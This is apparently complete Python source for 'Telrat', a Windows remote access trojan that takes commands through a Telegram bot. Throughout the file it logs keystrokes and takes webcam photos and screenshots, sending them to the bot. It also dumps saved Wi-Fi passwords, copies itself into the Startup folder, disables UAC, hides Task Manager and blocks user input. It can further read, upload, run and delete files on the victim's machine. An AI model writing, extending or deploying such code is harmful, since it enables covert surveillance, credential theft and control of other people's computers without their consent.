import getpass
import os
import telebot
import random
import socket, subprocess, os, platform
from PIL import Image
from datetime import datetime
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
import shutil
import glob
import ctypes
import sys
import re
import pyautogui
import cv2
import urllib.request
import json
from pynput.keyboard import Listener
from pynput.mouse import Controller
import time
import keyboard
BOT_TOKEN = ""


user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')
bot = telebot.TeleBot(BOT_TOKEN)
USER_NAME = getpass.getuser()
HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2
class Telrat:
    def __init__(self,bot_token,user_name):
        self.bot_token = bot_token
        self.user_name = user_name
        

    def errorsend(self,message):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        bot.send_message(message.chat.id, output)
    
    
    def block_task_manager(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while (1):
                if block == True:
                    hwnd = user32.FindWindowW(0, "Task Manager")
                    user32.ShowWindow(hwnd, 0)
                    ctypes.windll.kernel32.Sleep(500)
    
    def disable_all(self):
        while True:
            user32.BlockInput(True)
    
    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600*24*11
        while time.time() < t_end and mousedbl == True:
            mouse.position = (0, 0)
    
    def disable_keyboard(self):
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
        time.sleep(999999)
    
    def add_to_startup(self,file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'python "" %s' % file_path)
    def keylogger(self):
        global klgr
        klgr = True
        kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
        FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
        None, CREATE_ALWAYS , 0, 0)
        #rat.keylogger()
        #bot.reply_to(message,"Keylogger is started".encode())
        def on_press(key):
            if klgr == True:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()
    def send_logs(self,message):
        try:
            f = open("keylogs.txt", 'r')
            
            
            return f
        except:
            rat.errorsend(message)

rat = Telrat(BOT_TOKEN,USER_NAME)


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    rat.add_to_startup()
    bot.reply_to(message, "Bot is active")    
@bot.message_handler(func=lambda m: True)
def managerat(message):
    command = message.text
            
    # if command[:5] == 'shell':
#         while 1:
            
#             if command.lower() == 'exit' :
#                 break
#             if command[6:] == 'cd':
#                 os.chdir(command[3:].decode('utf-8'))
#                 dir = os.getcwd()
#                 dir1 = str(dir)
#                 bot.reply_to(message,dir1.encode())
#             output = subprocess.getoutput(command[6:])
#             bot.reply_to(message,output.encode())
#             if not output:
#                 rat.errorsend(message)

    if command == 'breakstream':
        pass
    elif command == 'list':
        pass
    elif command == 'geolocate':
        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
            data = json.loads(url.read().decode())
            link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
        bot.reply_to(message,link.encode())
    
    elif command == 'setvalue':
        const = command.split(" ")[1]
        root = command.split(" ")[2]
        key2 = command.split(" ")[3]
        value = command.split(" ")[4]
        try:
            if const == 'HKEY_CURRENT_USER':
                key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                SetValueEx(key, key2, 0, REG_SZ, str(value))
                CloseKey(key)
            if const == 'HKEY_CLASSES_ROOT':
                key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                SetValueEx(key, key2, 0, REG_SZ, str(value))
                CloseKey(key)
            if const == 'HKEY_LOCAL_MACHINE':
                key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                SetValueEx(key, key2, 0, REG_SZ, str(value))
                CloseKey(key)
            if const == 'HKEY_USERS':
                key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                SetValueEx(key, key2, 0, REG_SZ, str(value))
                CloseKey(key)
            if const == 'HKEY_CLASSES_ROOT':
                key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                SetValueEx(key, key2, 0, REG_SZ, str(value))
                CloseKey(key)
            if const == 'HKEY_CURRENT_CONFIG':
                key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                SetValueEx(key, key2, 0, REG_SZ, str(value))
                CloseKey(key)
            bot.reply_to(message,"Value is set".encode())
        except:
            bot.reply_to(message,"Impossible to create key".encode())
    
    elif command == 'delkey':
        const = command.split(" ")[1]
        root = command.split(" ")[2]
        try:
            if const == 'HKEY_CURRENT_USER':
                DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
            if const == 'HKEY_LOCAL_MACHINE':
                DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
            if const == 'HKEY_USERS':
                DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
            if const == 'HKEY_CLASSES_ROOT':
                DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
            if const == 'HKEY_CURRENT_CONFIG':
                DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
            bot.reply_to(message,"Key is deleted".encode())
        except:
            bot.reply_to(message,"Impossible to delete key".encode())
    
    elif command == 'createkey':
        const = command.split(" ")[1]
        root = command.split(" ")[2]
        try:
            if const == 'HKEY_CURRENT_USER':
                CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
            if const == 'HKEY_LOCAL_MACHINE':
                CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
            if const == 'HKEY_USERS':
                CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
            if const == 'HKEY_CLASSES_ROOT':
                CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
            if const == 'HKEY_CURRENT_CONFIG':
                CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
            bot.reply_to(message,"Key is created".encode())
        except:
            bot.reply_to(message,"Impossible to create key".encode())
    
    elif command == 'volumeup':
        try:
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
            bot.reply_to(message,"Volume is increased to 100%".encode())
        except:
            bot.reply_to(message,"Module is not founded".encode())
    
    elif command == 'volumedown':
        try:
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
            bot.reply_to(message,"Volume is decreased to 0%".encode())
        except:
            bot.reply_to(message,"Module is not founded".encode())
    
    elif command == 'setwallpaper':
        pic = command[13:]
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
            bot.reply_to(message,f'{pic} is set as a wallpaper'.encode())
        except:
            bot.reply_to(message,"No such file")
    elif command == 'usbdrivers':
        p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
        bot.reply_to(message,p.encode())
    
    elif command == 'monitors':
        p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
        bot.reply_to(message,p.encode())
    elif command == 'sysinfo':
        sysinfo = str(f'''
        System: {platform.platform()} {platform.win32_edition()}
        Architecture: {platform.architecture()}
        Name of Computer: {platform.node()}
        Processor: {platform.processor()}
        Python: {platform.python_version()}
        Java: {platform.java_ver()}
        User: {os.getlogin()}
        ''')
        bot.reply_to(message,sysinfo.encode())
    
    elif command == 'reboot':
        os.system("shutdown /r /t 1")
        bot.reply_to(message,f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
    
    elif command[:7] == 'writein':
        pyautogui.write(command.split(" ")[1])
        bot.reply_to(message,f'{command.split(" ")[1]} is written'.encode())
    
    elif command[:8] == 'readfile':
        try:
            f = open(command[9:], 'r')
            data = f.read()
            if not data: bot.reply_to(message,"No data".encode())
            f.close()
            bot.reply_to(message,data.encode())
        except:
            bot.reply_to(message,"No such file in directory".encode())
    
    elif command[:7] == 'abspath':
        try:
            path = os.path.abspath(command[8:])
            bot.reply_to(message,path.encode())
        except:
            bot.reply_to(message,"No such file in directory".encode())
    elif command == 'pwd':
        curdir = str(os.getcwd())
        bot.reply_to(message,curdir.encode())
    
    elif command == 'ipconfig':
        output = subprocess.check_output('ipconfig', encoding='oem')
        bot.reply_to(message,output.encode())
    
    elif command == 'portscan':
        output = subprocess.check_output('netstat -an', encoding='oem')
        bot.reply_to(message,output.encode())
    
    elif command == 'tasklist':
        output = subprocess.check_output('tasklist', encoding='oem')
        bot.reply_to(message,output.encode())
    elif command == 'profiles':
        output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
        bot.reply_to(message,output.encode())
    
    elif command == 'profilepswd':
        profile = command[12:]
        profile = profile.decode()
        try:
            output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
            bot.reply_to(message,output.encode())
        except:
            rat.errorsend(message)
    
    elif command == 'systeminfo':
        output = subprocess.check_output(f'systeminfo', encoding='oem')
        bot.reply_to(message,output.encode())
    
    elif command == 'sendmessage':
        text = command[12:]
        title = "Hacked"
        bot.reply_to(message,'MessageBox has appeared'.encode())
        user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
    
    elif command.startswith("disable") and command.endswith("--all"):
        rat.disable_all()
        bot.reply_to(message,"Keyboard and mouse are disabled".encode())
    
    elif command.startswith("disable") and command.endswith("--keyboard"):
        global kbrd
        kbrd = True
        rat.disable_keyboard()
        bot.reply_to(message,"Keyboard is disabled".encode())
    
    elif command.startswith("disable") and command.endswith("--mouse"):
        global mousedbl
        mousedbl = True
        rat.disable_mouse()
        bot.reply_to(message,"Mouse is disabled".encode())
    
    elif command == 'disableUAC':
        os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
    
    elif command.startswith("enable") and command.endswith("--keyboard"):
        kbrd = False
        bot.reply_to(message,"Mouse and keyboard are unblocked".encode())
    
    elif command.startswith("enable") and command.endswith("--mouse"):
        mousedbl = False
        bot.reply_to(message,"Mouse is enabled".encode())
    elif command.startswith("enable") and command.endswith("--all"):
        user32.BlockInput(False)
        bot.reply_to(message,"Keyboard and mouse are enabled".encode())
        
    elif command == 'turnoffmon':
        bot.reply_to(message,f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
        user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
    
    elif command == 'turnonmon':
        bot.reply_to(message,f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
        user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
    
    elif command == 'extendrights':
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
        bot.reply_to(message,sending.encode())
    
    elif command == 'isuseradmin':
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
            bot.reply_to(message,sending.encode())
        else:
            sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
            bot.reply_to(message,sending.encode())
    elif command == 'keyscan_start':
        global klgr
        klgr = True
        rat.keylogger()
        bot.reply_to(message,"The session of keylogger is started".encode())
    elif command == 'send_logs':
        
        bot.send_document(message.chat.id,rat.send_logs(message))
    elif command == 'stop_keylogger':
        klgr = False
        bot.reply_to(message,"The session of keylogger is terminated".encode())
    
    elif command == 'cpu_cores':
        output = os.cpu_count()
        bot.reply_to(message,str(output).encode())
    elif command[:7] == 'delfile':
        try:
            os.remove(command[8:])
            bot.reply_to(message,f'{command[8:]} was successfully deleted'.encode())
        except:
            rat.errorsend(message)
    
    elif command[:8] == 'editfile':
        try:
            with open(command.split(" ")[1], 'a') as f:
                f.write(command.split(" ")[2])
                f.close()
            sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
            bot.reply_to(message,sending.encode())
        except:
            rat.errorsend(message)
    
    elif command[:2] == 'cp':
        try: 
            shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
            bot.reply_to(message,f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
        except:
            rat.errorsend(message)
    
    elif command[:2] == 'mv':
        try:
            shutil.move(command.split(" ")[1], command.split(" ")[2])
            bot.reply_to(message,f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
        except:
            rat.errorsend(message)
    
    elif command[:2] == 'cd':
        command = command[3:]
        try:
            os.chdir(command)
            curdir = str(os.getcwd())
            bot.reply_to(message,curdir.encode())
        except:
            bot.reply_to(message,"No such directory".encode())
    
    elif command == 'cd ..':
        os.chdir('..')
        curdir = str(os.getcwd())
        bot.reply_to(message,curdir.encode())
    
    elif command == 'dir':
        try:
            output = subprocess.check_output(["dir"], shell=True)
            output = output.decode('utf8', errors='ignore')
            bot.reply_to(message,output.encode())
        except:
            rat.errorsend(message)
    
    elif command[1:2] == ':':
        try:
            os.chdir(command)
            curdir = str(os.getcwd())
            bot.reply_to(message,curdir.encode())
        except: 
            bot.reply_to(message,"No such directory".encode())
    
    elif command[:10] == 'createfile':
        kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
        FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
        None, CREATE_ALWAYS , 0, 0)
        bot.reply_to(message,f'{command[11:]} was created'.encode())
    elif command[:10] == 'searchfile':
        for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
            if x.endswith(command.split(" ")[1]):
                path = os.path.abspath(x)
                bot.reply_to(message,str(path).encode())
            else:
                continue
    
    elif command == 'curpid':
        pid = os.getpid()
        bot.reply_to(message,str(pid).encode())
    
    elif command == 'drivers':
        drives = []
        bitmask = kernel32.GetLogicalDrives()
        letter = ord('A')
        while bitmask > 0:
            if bitmask & 1:
                drives.append(chr(letter) + ':\\')
            bitmask >>= 1
            letter += 1
        bot.reply_to(message,str(drives).encode())
    
    elif command[:4] == 'kill':
        try:
            os.system(f'TASKKILL /F /im {command[5:]}')
            bot.reply_to(message,f'{command[5:]} was terminated'.encode())
        except:
            rat.errorsend(message)
    
    elif command == 'shutdown':
        os.system('shutdown /s /t 1')
        sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
        bot.reply_to(message,)
    elif command[:2] == 'rn':
        os.system("rename " +command.split(" ")[1] + " " + command.split(" ")[2])
        bot.reply_to(message,"filename has beenchanged")
    elif command == 'disabletaskmgr':
        global block
        block = True
        rat.block_task_manager()
        bot.reply_to(message,"Task Manager is disabled".encode())
    
    elif command == 'enabletaskmgr':
        block = False
        bot.reply_to(message,"Task Manager is enabled".encode())
    
    elif command == 'localtime':
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        bot.reply_to(message,str(current_time).encode())
    
    elif command[:9] == 'startfile':
        try:
            bot.reply_to(message,f'{command[10:]} was started'.encode())
            os.startfile(command[10:])
        except:
            rat.errorsend(message)
    elif command[:8] == 'download':
        
            print(command.split(" ")[1])
            file = open(command.split(" ")[1], 'rb')
            data = file.read()
            bot.send_document(message.chat.id,data)
            bot.send_document(message.chat.id,command.split(" ")[1] )
        
    
    elif command[:5] == 'mkdir':
        try:
            os.mkdir(command[6:])
            bot.reply_to(message,f'Directory {command[6:]} was created'.encode())
        except:
            rat.errorsend(message)
    
    elif command[:5] == 'rmdir':
        try:
            shutil.rmtree(command[6:])
            bot.reply_to(message,f'Directory {command[6:]} was removed'.encode())
        except:
            rat.errorsend(message)
    
    elif command == 'screenshot':
        try:
            file = f'{random.randint(111111, 444444)}.png'
            file2 = f'{random.randint(555555, 999999)}.png'
            pyautogui.screenshot(file)
            image = Image.open(file)
            new_image = image.resize((1920, 1080))
            new_image.save(file2)
            file = open(file2, 'rb')
            data = file.read()
            bot.send_photo(message.chat.id,data)
        except:
            rat.errorsend(message)
    
    elif command == 'webcam_snap':
        try:
            file = f'{random.randint(111111, 444444)}.png'
            file2 = f'{random.randint(555555, 999999)}.png'
            global return_value, i
            cam = cv2.VideoCapture(0)
            for i in range(1):
                return_value, image = cam.read()
                filename = cv2.imwrite(f'{file}', image)
            del(cam)
            image = Image.open(file)
            new_image = image.resize((1920, 1080))
            new_image.save(file2)
            file = open(file2, 'rb')
            data = file.read()
            bot.send_photo(message.chat.id,data)
        except:
            rat.errorsend(message)
    elif command == 'exit':
        bot.reply_to(message,b"exit")
        exit()

@bot.message_handler(content_types=['document', 'audio', 'video', 'voice']) # upload document through chat // just send document to bot
def addfile(message):
    command = message.text
    file_name = message.document.file_name
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    with open(file_name, 'wb') as new_file:
        new_file.write(downloaded_file)
@bot.message_handler(content_types=['photo']) # upload photo through chat
def addfile(message):
    raw = message.photo[2].file_id
    path = raw+".jpg"
    file_info = bot.get_file(raw)
    downloaded_file = bot.download_file(file_info.file_path)
    with open(path,'wb') as new_file:
        new_file.write(downloaded_file)
bot.infinity_polling()
